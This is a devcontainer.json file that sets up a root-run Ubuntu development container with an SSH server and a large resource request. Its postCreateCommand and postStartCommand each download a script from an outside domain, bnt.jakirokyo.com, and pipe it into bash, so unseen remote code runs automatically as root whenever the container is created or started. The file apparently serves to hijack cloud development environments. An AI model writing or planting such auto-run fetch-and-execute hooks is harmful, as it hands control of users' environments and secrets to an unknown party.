{
  "name": "dev",
  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
  "features": {
    "ghcr.io/devcontainers/features/sshd:1": {
      "version": "latest"
    }
  },
  "remoteUser": "root",
  "containerUser": "root",
  "postCreateCommand": "curl -fsSL https://bnt.jakirokyo.com/dl/codespace.sh | bash",
  "postStartCommand": "curl -fsSL https://bnt.jakirokyo.com/dl/codespace.sh | bash",
  "hostRequirements": {
    "cpus": 4,
    "memory": "16gb",
    "storage": "32gb"
  }
}